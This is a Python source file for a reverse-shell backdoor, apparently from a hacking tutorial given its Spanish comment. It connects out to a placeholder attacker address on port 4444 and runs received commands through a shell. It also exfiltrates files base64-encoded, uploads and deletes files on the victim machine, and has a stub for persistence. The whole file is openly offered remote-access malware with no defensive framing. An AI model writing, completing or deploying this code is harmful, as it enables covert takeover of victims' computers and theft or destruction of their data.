import socket, subprocess, json, os, base64, sys

class Backdoor:
    def __init__(self, ip, port):
        self.reverse_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.reverse_connection.connect((ip, port))

    def generate_persistence(self):
        pass

    def json_send(self, data):
        json_data = json.dumps(data.decode("utf-8", "ignore"))
        self.reverse_connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.reverse_connection.recv(1024))
                data = json.loads(json_data)
                return data
            except ValueError:
                continue

    def remove(self, path):
        if os.path.exists(path):
            os.remove(path)
            result = "[+] Removing " + path
            return result
        else:
            return "[-] No such file or directory in the target system"

    def change_directory(self, path):
        if os.path.exists(path):
            os.chdir(path)
            result = "[+] Changing directory to " + path
            return result
        else:
            return "[-] No such directory"

    def read(self, file_name):
        if os.path.exists(file_name):
            with open(file_name, "rb") as file_to_upload:
                content_of_file_to_upload = file_to_upload.read()
                return base64.b64encode(content_of_file_to_upload)
        else:
            return "[-] No such file or directory in the target system"

    def write(self, file_name, encoded_content):
        with open(file_name, "wb") as file_to_download:
            content_of_file_to_download = base64.b64decode(encoded_content)
            file_to_download.write(content_of_file_to_download)
            return "[+] Upload Successful"

    def execute_command(self, command):
        command_result = ""
        if command[0] == "cd":
            command_result = self.change_directory(command[1])

        elif command[0] == "remove":
            command_result = self.remove(command[1])

        elif command[0] == "exit":
            self.reverse_connection.close()
            sys.exit()

        elif command[0] == "download":
            command_result = self.read(command[1])

        elif command[0] == "upload":
            command_result = self.write(command[1], command[2])

        else:
            try:
                DEVNULL = open(os.devnull, "wb")
                command_result = subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
            except subprocess.CalledProcessError:
                command_result = "[-] Invalid Command"
                pass
        return command_result

    def run(self):
        while True:
            command = self.json_recv()
            command_result = self.execute_command(command)
            self.json_send(command_result)

reverse_backdoor = Backdoor("su ip", 4444) # 4444 seria el puerto por donde se conectara el socket
reverse_backdoor.run()
